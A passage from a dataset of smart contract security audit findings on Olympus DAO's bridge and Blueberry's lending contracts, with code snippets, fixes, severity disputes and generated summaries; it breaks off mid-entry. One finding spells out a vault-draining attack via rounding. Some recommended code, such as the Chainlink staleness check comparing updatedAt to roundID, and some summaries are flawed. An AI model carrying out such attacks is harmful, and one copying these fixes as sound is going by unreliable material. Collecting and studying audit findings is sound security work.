      "content": "## Internal Functions Analysis\n\nThese two internal functions are not used within the contract.\n\n## File Reference\n**File:** `src/policies/CrossChainBridge.sol`  \n**Language:** Solidity\n\n### Functions\n- **Function:** `_checkGasLimit()`\n- **Function:** `_getGasLimit(bytes memory adapterParams_)`\n\nSimilarly, `setMinDstGas()` is designed to determine the minimum amount of gas required to verify the gas limit. However, since `_checkGasLimit` is not being used, both the function and the related storage are unnecessary.\n\n## Storage\n**File:** `src/policies/CrossChainBridge.sol`  \n**Language:** Solidity\n\n```solidity\nmapping(uint16 => mapping(uint16 => uint256)) public minDstGasLookup;\n```\n\n- **Function:** `setMinDstGas()`\n\nThis constant is also not used anywhere.\n\n## Constant\n**File:** `src/policies/CrossChainBridge.sol`  \n**Language:** Solidity\n\n```solidity\n/// @notice LZ endpoint packet type\nuint16 public constant PT_SEND = 0;\n```\n\n## Remediation\nRemove unnecessary contract code.\n\n## Patch\nFixed in #120.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48244",
      "title": "Ambiguous Offchain Counter Design",
      "impact": "LOW",
      "content": "## Cross Chain Bridge Solidity Policy Review\n\n## Code Snippet\n```solidity\nif (counterEnabled) offchainOhmCounter -= amount;\nMINTR.increaseMintApproval(address(this), amount);\nMINTR.mintOhm(to, amount);\n```\n\n## Safety Considerations\nThe `counterEnabled` feature is only safe if:\n\n1. OHM is only minted outside of `CrossChainBridge` on exactly one chain, presumably mainnet.\n2. The counter is only enabled on that chain.\n\nOtherwise, unaccounted-for OHM could underflow the counter, making it impossible to recover bridged OHM.\n\n## Remediation\nCurrently, the comment is ambiguous. Consider explicitly documenting this behaviour.\n\n```solidity\n/// @notice Flag for if offchain OHM counter is enabled or not\nbool public counterEnabled; // NOTE: Currently only used on mainnet\n```\n\n## Patch\nFixed in #120.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48243",
      "title": "Invalid Message Replay Design",
      "impact": "HIGH",
      "content": "## Replay Messages and Access Control Issues\n\nWhen messages are replayed, thereâ€™s a direct internal call to `_receiveMessage`.\n\n### Source Code Reference\n`src/policies/CrossChainBridge.sol` (SOLIDITY)\n\n```solidity\n// Execute the message. revert if it fails again\n_receiveMessage(srcChainId_, srcAddress_, nonce_, payload_);\nemit RetryMessageSuccess(srcChainId_, srcAddress_, nonce_, payloadHash);\n```\n\nHowever, this code performs an access control check on the sender, which will cause the invocation to abort.\n\n### Source Code Reference\n`src/policies/CrossChainBridge.sol` (SOLIDITY)\n\n```solidity\n// Needed to restrict access to low-level call from lzReceive\nif (msg.sender != address(this)) revert Bridge_InvalidCaller();\n```\n\nAs a result, the replay feature does not work. Messages that failed the initial invocation would lead to permanently locking up OHM tokens in the contract.\n\n## Remediation\n\nConsider mirroring the LayerZero endpoint, which performs an external call to properly set `msg.sender`.\n\n### Source Code Reference\n`Endpoint.sol` (SOLIDITY)\n\n```solidity\nILayerZeroReceiver(dstAddress).lzReceive(_srcChainId, _srcAddress, nonce, _payload);\nemit PayloadCleared(_srcChainId, _srcAddress, nonce, dstAddress);\n```\n\n## Patch\n\nFixed in #120.",
      "summary": "\nThis bug report discusses a problem with a feature called \"replay\" in the CrossChainBridge smart contract. When this feature is used, there is a direct internal call to a function called _receiveMessage. However, there is a code error that causes an access control check to fail, which means that the feature does not work properly. This can result in the contract becoming permanently locked and causing issues with OHM tokens. The suggested solution is to mirror a different endpoint that will properly set the sender address. This issue has been fixed in a recent update.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "6665",
      "title": "M-18: ChainlinkAdapterOracle use BTC/USD chainlink oracle to price WBTC which is problematic if WBTC depegs",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/9 \n\n## Found by \n0x52\n\n## Summary\n\nThe chainlink BTC/USD oracle is used to price WBTC ([docs](https://docs.blueberry.garden/lending-protocol/price-oracle#price-feed-alternative)). WBTC is basically a bridged asset and if the bridge is compromised/fails then WBTC will depeg and will no longer be equivalent to BTC. This will lead to large amounts of borrowing against an asset that is now effectively worthless. Since the protocol still values it via BTC/USD the protocol will not only be stuck with the bad debt caused by the currently outstanding loans but they will also continue to give out bad loans and increase the amount of bad debt further\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nProtocol will take on a large amount of bad debt should WBTC bridge become compromised and WBTC depegs\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/ChainlinkAdapterOracle.sol#L47-L59\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI would recommend using a double oracle setup. Use both the Chainlink and another on-chain liquidity base oracle (i.e. UniV3 TWAP). If the price of the on-chain liquidity oracle drops below a certain threshold of the Chainlink oracles (i.e. 2% lower), any borrowing should be immediately halted. The chainlink oracle will prevent price manipulation and the liquidity oracle will safeguard against the asset depegging.",
      "summary": "\nThis bug report is about an issue found in the ChainlinkAdapterOracle code which uses a BTC/USD chainlink oracle to price WBTC. This is problematic because if the bridge connecting WBTC to BTC is compromised or fails, WBTC will no longer be equivalent to BTC and the protocol will take on a large amount of bad debt from outstanding loans. The code snippet linked in the report is from the ChainlinkAdapterOracle.sol file on line 47 to 59. The tool used to find this issue was manual review. The recommendation given is to use a double oracle setup with both a Chainlink and an on-chain liquidity base oracle, such as UniV3 TWAP. If the price of the on-chain liquidity oracle drops below a certain threshold of the Chainlink oracles, any borrowing should be immediately halted. This will prevent price manipulation and safeguard against the asset depegging.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/9",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6664",
      "title": "M-17: WIchiFarm will break after second deposit of LP",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/15 \n\n## Found by \n0x52\n\n## Summary\n\nWIchiFarm.sol makes the incorrect assumption that IchiVaultLP doesn't reduce allowance when using the transferFrom if allowance is set to type(uint256).max. Looking at a currently deployed [IchiVault](https://etherscan.io/token/0x683f081dbc729dbd34abac708fa0b390d49f1c39#code#L2281) this assumption is not true. On the second deposit for the LP token, the call will always revert at the safe approve call.\n\n## Vulnerability Detail\n\n[IchiVault](https://etherscan.io/token/0x683f081dbc729dbd34abac708fa0b390d49f1c39#code#L2281)\n\n      function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n          _transfer(sender, recipient, amount);\n          _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n          return true;\n      }\n\nThe above lines show the trasnferFrom call which reduces the allowance of the spender regardless of whether the spender is approved for type(uint256).max or not. \n\n        if (\n            IERC20Upgradeable(lpToken).allowance(\n                address(this),\n                address(ichiFarm)\n            ) != type(uint256).max\n        ) {\n            // We only need to do this once per pool, as LP token's allowance won't decrease if it's -1.\n            IERC20Upgradeable(lpToken).safeApprove(\n                address(ichiFarm),\n                type(uint256).max\n            );\n        }\n\nAs a result after the first deposit the allowance will be less than type(uint256).max. When there is a second deposit, the reduced allowance will trigger a safeApprove call.\n\n    function safeApprove(\n        IERC20Upgradeable token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n\nsafeApprove requires that either the input is zero or the current allowance is zero. Since neither is true the call will revert. The result of this is that WIchiFarm is effectively broken after the first deposit.\n\n## Impact\n\nWIchiFarm is broken and won't be able to process deposits after the first.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/wrapper/WIchiFarm.sol#L38\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOnly approve is current allowance isn't enough for call. Optionally add zero approval before the approve. Realistically it's impossible to use the entire type(uint256).max, but to cover edge cases you may want to add it.\n\n        if (\n            IERC20Upgradeable(lpToken).allowance(\n                address(this),\n                address(ichiFarm)\n    -       ) != type(uint256).max\n    +       ) < amount\n        ) {\n\n    +       IERC20Upgradeable(lpToken).safeApprove(\n    +           address(ichiFarm),\n    +           0\n            );\n            // We only need to do this once per pool, as LP token's allowance won't decrease if it's -1.\n            IERC20Upgradeable(lpToken).safeApprove(\n                address(ichiFarm),\n                type(uint256).max\n            );\n        }\n\n## Discussion\n\n**SergeKireev**\n\nEscalate for 31 USDC\n\nThe impact stated is medium, since it only prevents additional deposits and no funds are at risk.\nThe high severity definition as stated per Sherlock docs:\n\n>This vulnerability would result in a material loss of funds and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\n\n**sherlock-admin**\n\n > Escalate for 31 USDC\n> \n> The impact stated is medium, since it only prevents additional deposits and no funds are at risk.\n> The high severity definition as stated per Sherlock docs:\n> \n> >This vulnerability would result in a material loss of funds and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\n\nYou've created a valid escalation for 31 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted \n\nAs the impact is only preventing further deposits rendering the farm contract useless, without causing a loss of funds. \n\n**sherlock-admin**\n\n> Escalation accepted \n> \n> As the impact is only preventing further deposits rendering the farm contract useless, without causing a loss of funds. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug report has been filed for WIchiFarm.sol, which makes the incorrect assumption that IchiVaultLP doesn't reduce allowance when using the transferFrom if allowance is set to type(uint256).max. After the first deposit, the allowance will be less than type(uint256).max, and when there is a second deposit, the reduced allowance will trigger a safeApprove call which requires that either the input is zero or the current allowance is zero. Since neither is true, the call will revert and WIchiFarm will be broken after the first deposit.\n\nThe impact of this bug is medium, since it only prevents additional deposits and no funds are at risk. The bug was found manually and the code snippet can be found at https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/wrapper/WIchiFarm.sol#L38.\n\nThe recommendation to fix this bug is to only approve is current allowance isn't enough for call. Optionally add zero approval before the approve, or to cover edge cases, add type(uint256).max. After the 48-hour escalation window closes, the escalation becomes final and contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/15",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6663",
      "title": "M-16: ChainlinkAdapterOracle will return the wrong price for asset if underlying aggregator hits minAnswer",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/18 \n\n## Found by \n0x52\n\n## Summary\n\nChainlink aggregators have a built in circuit breaker if the price of an asset goes outside of a predetermined price band. The result is that if an asset experiences a huge drop in value (i.e. LUNA crash) the price of the oracle will continue to return the minPrice instead of the actual price of the asset. This would allow user to continue borrowing with the asset but at the wrong price. This is exactly what happened to [Venus on BSC when LUNA imploded](https://rekt.news/venus-blizz-rekt/). \n\n## Vulnerability Detail\n\nChainlinkAdapterOracle uses the [ChainlinkFeedRegistry](https://etherscan.io/address/0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf) to obtain the price of the requested tokens.\n\n    function latestRoundData(\n      address base,\n      address quote\n    )\n      external\n      view\n      override\n      checkPairAccess()\n      returns (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 answeredInRound\n      )\n    {\n      uint16 currentPhaseId = s_currentPhaseId[base][quote];\n      //@audit this pulls the Aggregator for the requested pair\n      AggregatorV2V3Interface aggregator = _getFeed(base, quote);\n      require(address(aggregator) != address(0), \"Feed not found\");\n      (\n        roundId,\n        answer,\n        startedAt,\n        updatedAt,\n        answeredInRound\n      ) = aggregator.latestRoundData();\n      return _addPhaseIds(roundId, answer, startedAt, updatedAt, answeredInRound, currentPhaseId);\n    }\n\nChainlinkFeedRegistry#latestRoundData pulls the associated aggregator and requests round data from it. ChainlinkAggregators have minPrice and maxPrice circuit breakers built into them. This means that if the price of the asset drops below the minPrice, the protocol will continue to value the token at minPrice instead of it's actual value. This will allow users to take out huge amounts of bad debt and bankrupt the protocol.\n\nExample:\nTokenA has a minPrice of $1. The price of TokenA drops to $0.10. The aggregator still returns $1 allowing the user to borrow against TokenA as if it is $1 which is 10x it's actual value.\n\nNote:\nChainlink oracles are used a just one piece of the OracleAggregator system and it is assumed that using a combination of other oracles, a scenario like this can be avoided. However this is not the case because the other oracles also have their flaws that can still allow this to be exploited. As an example if the chainlink oracle is being used with a UniswapV3Oracle which uses a long TWAP then this will be exploitable when the TWAP is near the minPrice on the way down. In a scenario like that it wouldn't matter what the third oracle was because it would be bypassed with the two matching oracles prices. If secondary oracles like Band are used a malicious user could DDOS relayers to prevent update pricing. Once the price becomes stale the chainlink oracle would be the only oracle left and it's price would be used.\n\n## Impact\n\nIn the event that an asset crashes (i.e. LUNA) the protocol can be manipulated to give out loans at an inflated price\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/ChainlinkAdapterOracle.sol#L66-L84\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChainlinkAdapterOracle should check the returned answer against the minPrice/maxPrice and revert if the answer is outside of the bounds:\n\n        (, int256 answer, , uint256 updatedAt, ) = registry.latestRoundData(\n            token,\n            USD\n        );\n        \n    +   if (answer >= maxPrice or answer <= minPrice) revert();\n    \n    \n\n## Discussion\n\n**Gornutz**\n\nThe aggregator is responding with answers from the multiple of oracle sources\n\n**IAm0x52**\n\nEscalate for 50 USDC\n\nThis is not a dupe of #94\n\n```The aggregator is responding with answers from the multiple of oracle sources```\n\nThis comment is true but in my submission I address this exact issue and why it's still an issue even if the aggregator has multiple sources:\n\n> Note:\n> Chainlink oracles are used a just one piece of the OracleAggregator system and it is assumed that using a combination of other oracles, a scenario like this can be avoided. However this is not the case because the other oracles also have their flaws that can still allow this to be exploited. As an example if the chainlink oracle is being used with a UniswapV3Oracle which uses a long TWAP then this will be exploitable when the TWAP is near the minPrice on the way down. In a scenario like that it wouldn't matter what the third oracle was because it would be bypassed with the two matching oracles prices. If secondary oracles like Band are used a malicious user could DDOS relayers to prevent update pricing. Once the price becomes stale the chainlink oracle would be the only oracle left and it's price would be used.```\n\nEven with the structure of aggregator there are still lots of scenarios where this could cause an issue. The chainlink oracle needs to revert at min/max answer because otherwise it risk returning the wrong price and causing the collateral to be overvalued leading to huge amounts of abuse.\n\n**sherlock-admin**\n\n > Escalate for 50 USDC\n> \n> This is not a dupe of #94\n> \n> ```The aggregator is responding with answers from the multiple of oracle sources```\n> \n> This comment is true but in my submission I address this exact issue and why it's still an issue even if the aggregator has multiple sources:\n> \n> > Note:\n> > Chainlink oracles are used a just one piece of the OracleAggregator system and it is assumed that using a combination of other oracles, a scenario like this can be avoided. However this is not the case because the other oracles also have their flaws that can still allow this to be exploited. As an example if the chainlink oracle is being used with a UniswapV3Oracle which uses a long TWAP then this will be exploitable when the TWAP is near the minPrice on the way down. In a scenario like that it wouldn't matter what the third oracle was because it would be bypassed with the two matching oracles prices. If secondary oracles like Band are used a malicious user could DDOS relayers to prevent update pricing. Once the price becomes stale the chainlink oracle would be the only oracle left and it's price would be used.```\n> \n> Even with the structure of aggregator there are still lots of scenarios where this could cause an issue. The chainlink oracle needs to revert at min/max answer because otherwise it risk returning the wrong price and causing the collateral to be overvalued leading to huge amounts of abuse.\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Gornutz**\n\nGiven the multi-aggregator setup we will use, once price hits Chainlink's oracles will at their min value. The other oracles will respond with a price well below that min value and will have a large enough deviation to cause a revert. Since the assets will be pooling from Chainlink / Band / Twap. Think setting a min / max inside of the chainlink oracle directly will potentially cause additional attack vectors to be created.\n\n**hrishibhat**\n\nEscalation accepted\n\nNot a duplicate of #94 \nThis issue is a valid medium\nGiven the unlikely edge case of Chainlink hitting minimum value as a result of a serious price movement and resulting in undercollateralized borrowing. \n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> This issue is a valid medium\n> Given the unlikely edge case of Chainlink hitting minimum value as a result of a serious price movement and resulting in undercollateralized borrowing. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the ChainlinkAdapterOracle which could return the wrong price for an asset if the underlying aggregator hits minAnswer. The issue was found by 0x52 and is related to the ChainlinkFeedRegistry which pulls the associated aggregator and requests round data from it. The aggregator has minPrice and maxPrice circuit breakers built into them, so if the price of the asset drops below the minPrice, the protocol will continue to value the token at minPrice instead of its actual value. This would allow users to take out huge amounts of bad debt and bankrupt the protocol. \n\nThe code snippet for this issue can be found at https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/ChainlinkAdapterOracle.sol#L66-L84. The impact of this issue is that in the event that an asset crashes (i.e. LUNA), the protocol can be manipulated to give out loans at an inflated price. \n\nThe recommendation is that ChainlinkAdapterOracle should check the returned answer against the minPrice/maxPrice and revert if the answer is outside of the bounds. There was discussion about how this issue could still be exploitable even with the multi-aggregator setup and the use of other oracles. The issue was accepted and the contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/18",
      "tags": [
        "Oracle",
        "Chainlink"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6662",
      "title": "M-15: onlyEOAEx modifier that ensures call is from EOA might not hold true in the future",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/21 \n\n## Found by \nkoxuan\n\n## Summary\nmodifier `onlyEOAEx` is used to ensure calls are only made from EOA. However, EIP 3074 suggests that using `onlyEOAEx` modifier to ensure calls are only from EOA might not hold true.\n\n## Vulnerability Detail\nFor `onlyEOAEx`, `tx.origin` is used to ensure that the caller is from an EOA and not a smart contract.\n```solidity\n    modifier onlyEOAEx() {\n        if (!allowContractCalls && !whitelistedContracts[msg.sender]) {\n            if (msg.sender != tx.origin) revert NOT_EOA(msg.sender);\n        }\n        _;\n    }\n\n```\n\nHowever, according to [EIP 3074](https://eips.ethereum.org/EIPS/eip-3074#abstract),\n\nThis EIP introduces two EVM instructions AUTH and AUTHCALL. The first sets a context variable authorized based on an ECDSA signature. The second sends a call as the authorized account. This essentially delegates control of the externally owned account (EOA) to a smart contract.\n\nTherefore, using tx.origin to ensure msg.sender is an EOA will not hold true in the event EIP 3074 goes through.\n\n\n\n## Impact\n\nUsing modifier `onlyEOAEx` to ensure calls are made only from EOA will not hold true in the event EIP 3074 goes through. \n\n## Code Snippet\n[BlueBerryBank.sol#L54-L59](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L54-L59)\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRecommend using OpenZepellin's `isContract` function (https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-isContract-address-). Note that there are edge cases like contract in constructor that can bypass this and hence caution is required when using this.\n\n```solidity\n    modifier onlyEOAEx() {\n        if (!allowContractCalls && !whitelistedContracts[msg.sender]) {\n            if (isContract(msg.sender)) revert NOT_EOA(msg.sender);\n        }\n        _;\n    }\n\n```",
      "summary": "\nThis bug report is about the modifier `onlyEOAEx`, which is used to ensure calls are only made from Externally Owned Accounts (EOA). According to the Ethereum Improvement Proposal (EIP) 3074, two EVM instructions (AUTH and AUTHCALL) have been introduced which could allow smart contracts to delegate control of an EOA. This means that using modifier `onlyEOAEx` to ensure calls are only from EOA might not hold true in the future. The code snippet provided in the report is found in the BlueBerryBank.sol file on line 54-59. The impact of this issue is that using modifier `onlyEOAEx` to ensure calls are made only from EOA will not hold true in the event EIP 3074 goes through. The tool used to identify this issue was manual review. The recommendation is to use OpenZeppelin's `isContract` function to prevent this issue. This function will check if the sender is a contract and revert the transaction if it is.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/21",
      "tags": [],
      "finders": [
        "koxuan"
      ]
    },
    {
      "id": "6661",
      "title": "M-14: A borrower might drain the vault by calling borrow() repeatedly with small borrow amount each time.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/45 \n\n## Found by \nchaduke\n\n## Summary\nA borrower might drain the vault by calling ``borrow()`` repeatedly with small borrow amount that converts to a zero debt share each time.  \n\n## Vulnerability Detail\nThis is possible because ``borrow()`` does not check whether the number of shares borrowed is equal to zero or not. Therefore, an attacker can take advantage of the rounding error and borrow funds for free. We show how a borrowed can drain the vault by calling borrow() repeatedly:\n\n1) Suppose the for a particular token X, the total bank debt is 1000,000 and the total debt share is 100,000. That is each debt share has a 10 debt. \n\n2) A malicious borrower Bob can call ``borrow()`` (via SPELL) and borrow 9 each time, which will convert to ``9*100,000/1000,000 = 0`` debt shares.\n\n[https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L709-L735](https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L709-L735)\n\n3) As a result, the borrower can steal 9 X tokens each time the ``borrow()`` is called without increasing his debt shares. Bob can call this repeatedly in one transaction ``Steal()`` (within the gas limit) to borrow many tokens of X without increasing any debt shares. \n\n4) Call ``Steal()`` many times, Bob will be able to drain the vault. \n \n\n## Impact\nA malicious borrower can drain the the vault by calling ``borrow()`` repeatedly.\n\n## Code Snippet\nSee above\n\n## Tool used\nVScode\nManual Review\n\n## Recommendation\nBorrow should revert when ``newShare == 0``.\n```diff\n function borrow(address token, uint256 amount)\n        external\n        override\n        inExec\n        poke(token)\n        onlyWhitelistedToken(token)\n    {\n        if (!isBorrowAllowed()) revert BORROW_NOT_ALLOWED();\n        Bank storage bank = banks[token];\n        Position storage pos = positions[POSITION_ID];\n        uint256 totalShare = bank.totalShare;\n        uint256 totalDebt = bank.totalDebt;\n        uint256 share = totalShare == 0\n            ? amount\n            : (amount * totalShare).divCeil(totalDebt);\n+       if(share == 0) revert BorrowZeroShare();\n\n        bank.totalShare += share;\n        uint256 newShare = pos.debtShareOf[token] + share;\n        pos.debtShareOf[token] = newShare;\n        if (newShare > 0) {\n            pos.debtMap |= (1 << uint256(bank.index));\n        }\n        IERC20Upgradeable(token).safeTransfer(\n            msg.sender,\n            doBorrow(token, amount)\n        );\n        emit Borrow(POSITION_ID, msg.sender, token, amount, share);\n    }\n\n```",
      "summary": "\nThis bug report is about a vulnerability found in the code of the BlueBerryBank smart contract, which is a part of the Sherlock Audit project. The vulnerability allows an attacker to drain the vault by calling the ``borrow()`` function repeatedly with a small borrow amount each time. This is possible because the ``borrow()`` function does not check whether the number of shares borrowed is equal to zero or not, and thus the attacker can take advantage of the rounding error and borrow funds for free. \n\nThe impact of this vulnerability is that a malicious borrower can drain the the vault by calling ``borrow()`` repeatedly. The code snippet provided in the report shows a recommended fix to the vulnerability, which involves reverting the ``borrow()`` function when the ``newShare`` is equal to zero. The tools used to find this vulnerability were VScode and Manual Review.",
      "quality_score": 4,
      "rarity_score": 4.5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/45",
      "tags": [],
      "finders": [
        "chaduke"
      ]
    },
    {
      "id": "6660",
      "title": "M-13: BasicSpell.doCutRewardsFee uses depositFee instead of withdraw fee",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/82 \n\n## Found by \nrvierdiiev\n\n## Summary\nBasicSpell.doCutRewardsFee uses depositFee instead of withdraw fee\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/BasicSpell.sol#L65-L79\n```solidity\n    function doCutRewardsFee(address token) internal {\n        if (bank.config().treasury() == address(0)) revert NO_TREASURY_SET();\n\n\n        uint256 balance = IERC20Upgradeable(token).balanceOf(address(this));\n        if (balance > 0) {\n            uint256 fee = (balance * bank.config().depositFee()) / DENOMINATOR;\n            IERC20Upgradeable(token).safeTransfer(\n                bank.config().treasury(),\n                fee\n            );\n\n\n            balance -= fee;\n            IERC20Upgradeable(token).safeTransfer(bank.EXECUTOR(), balance);\n        }\n    }\n```\nThis function is called in order to get fee from ICHI rewards, collected by farming.\nBut currently it takes `bank.config().depositFee()` instead of `bank.config().withdrawFee()`.\n## Impact\nWrong fee amount is taken.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/BasicSpell.sol#L65-L79\n## Tool used\n\nManual Review\n\n## Recommendation\nTake withdraw fee from rewards.",
      "summary": "\nThis bug report is about the BasicSpell.doCutRewardsFee function in the 2023-02-blueberry-judging project on Github. The bug was found by rvierdiiev using manual review. The bug is that this function takes the bank.config().depositFee() instead of the bank.config().withdrawFee() when getting fee from ICHI rewards collected by farming. This means that the wrong fee amount is taken, resulting in an impact to the project. The code snippet and recommendation for this bug is given in the report. The recommendation is to take the withdraw fee from rewards.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/82",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "6659",
      "title": "M-12: Chainlink's latestRoundData  return stale or incorrect result",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94 \n\n## Found by \n8olidity, tsvetanovv, WatchDogs, Nyx, Avci, obront, Aymen0909, SPYBOY, HonorLt, csanuragjain, koxuan, evan, rbserver, hl\\_, peanuts, Chinmay\n\n## Summary\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/ChainlinkAdapterOracle.sol#L76\n\n## Vulnerability Detail\n\n## Impact\nOn ChainlinkAdapterOracle.sol, you are using latestRoundData, but there is no check if the return value indicates stale data. \n```solidity\nfunction getPrice(address _token) external view override returns (uint256) {\n        // remap token if possible\n        address token = remappedTokens[_token];\n        if (token == address(0)) token = _token;\n\n        uint256 maxDelayTime = maxDelayTimes[token];\n        if (maxDelayTime == 0) revert NO_MAX_DELAY(_token);\n\n        // try to get token-USD price\n        uint256 decimals = registry.decimals(token, USD);\n        (, int256 answer, , uint256 updatedAt, ) = registry.latestRoundData(\n            token,\n            USD\n        );\n        if (updatedAt < block.timestamp - maxDelayTime)\n            revert PRICE_OUTDATED(_token);\n\n        return (answer.toUint256() * 1e18) / 10**decimals;\n    }\n```\nThis could lead to stale prices according to the Chainlink documentation:\nhttps://docs.chain.link/data-feeds/price-feeds/historical-data\nRelated report:\nhttps://github.com/code-423n4/2021-05-fairside-findings/issues/70\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/ChainlinkAdapterOracle.sol#L76\n## Tool used\n\nManual Review\n\n## Recommendation\nAdd the below check for returned data\n```solidity\nfunction getPrice(address _token) external view override returns (uint256) {\n        // remap token if possible\n        address token = remappedTokens[_token];\n        if (token == address(0)) token = _token;\n\n        uint256 maxDelayTime = maxDelayTimes[token];\n        if (maxDelayTime == 0) revert NO_MAX_DELAY(_token);\n\n        // try to get token-USD price\n        uint256 decimals = registry.decimals(token, USD);\n        (uint80 roundID, int256 answer, uint256 timestamp, uint256 updatedAt, ) = registry.latestRoundData(\n            token,\n            USD\n        );\n        //Solution\n        require(updatedAt >= roundID, \"Stale price\");\n        require(timestamp != 0,\"Round not complete\");\n        require(answer > 0,\"Chainlink answer 